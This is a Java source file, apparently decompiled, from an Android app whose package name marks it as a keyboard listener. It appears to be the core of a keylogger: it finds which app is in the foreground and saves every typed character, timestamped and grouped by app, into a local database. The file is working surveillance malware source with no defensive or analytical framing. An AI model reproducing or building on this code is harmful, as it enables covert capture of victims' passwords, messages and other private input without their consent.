package hack.hackit.pankaj.keyboardlisten;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build.VERSION;
import android.util.Log;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;
import java.util.TimeZone;

public class Driver {
    private static Context context;
    public static MyDatabaseHelper mdh = null;
    private String table_name = "All";

    public static AppPackageInfo getCurrentAppName() {
        Driver ma = new Driver();
        if (VERSION.SDK_INT >= 21) {
            return getActivePackages1();
        }
        return ma.getActivePackages();
    }

    public static AppPackageInfo getActivePackages1() {
        context = HKApplication.getAppContext();
        String currentAppName = BuildConfig.FLAVOR;
        String currentAppPackage = BuildConfig.FLAVOR;
        Set<String> activePackages = new HashSet();
        PackageManager pm = context.getPackageManager();
        Context context = context;
        Context context2 = context;
        for (RunningAppProcessInfo processInfo : ((ActivityManager) context.getSystemService("activity")).getRunningAppProcesses()) {
            try {
                String op = pm.getApplicationLabel(pm.getApplicationInfo(processInfo.processName, 128)).toString();
                if (!(op.equals("System UI") || op.equals("Android System") || op.equals("LocationServices") || op.equals("Phone") || op.equals("Bluetooth") || processInfo.importance != 100)) {
                    currentAppPackage = processInfo.processName;
                    currentAppName = op;
                    break;
                }
            } catch (Exception e) {
            }
        }
        return new AppPackageInfo(currentAppName, currentAppPackage);
    }

    public AppPackageInfo getActivePackages() {
        context = HKApplication.getAppContext();
        String foregroundTaskPackageName = BuildConfig.FLAVOR;
        String appname = BuildConfig.FLAVOR;
        try {
            Context context = context;
            Context context2 = context;
            foregroundTaskPackageName = ((RunningTaskInfo) ((ActivityManager) context.getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName();
            PackageManager pm = context.getPackageManager();
            appname = pm.getPackageInfo(foregroundTaskPackageName, 0).applicationInfo.loadLabel(pm).toString();
        } catch (Exception e) {
        }
        return new AppPackageInfo(appname, foregroundTaskPackageName);
    }

    public void makeAnObject(AppPackageInfo appInfo, String s_char) {
        String appName = appInfo.getApp_name();
        String packageName = appInfo.getApp_package_name();
        mdh = new MyDatabaseHelper(context);
        String now = mycurrentTime();
        if (mdh.getRowCount(this.table_name) == 0) {
            mdh.insertRecord(new KeyEventData(appName, now, s_char, packageName), this.table_name);
        } else {
            KeyEventData lastObject = mdh.getLastRecord(this.table_name);
            if (lastObject.get_ApplicationName().equals(appName)) {
                mdh.updateData(lastObject.get_SrNo(), now, lastObject.get_TypedText() + s_char);
            } else {
                mdh.insertRecord(new KeyEventData(appName, now, s_char, packageName), this.table_name);
            }
        }
        mdh = null;
    }

    public static String mycurrentTime() {
        Date currentLocalTime = Calendar.getInstance(TimeZone.getDefault()).getTime();
        DateFormat date = new SimpleDateFormat("dd-MM-yyyy HH:mm a");
        date.setTimeZone(TimeZone.getDefault());
        String localTime = date.format(currentLocalTime);
        Log.w("time", localTime);
        return localTime;
    }
}
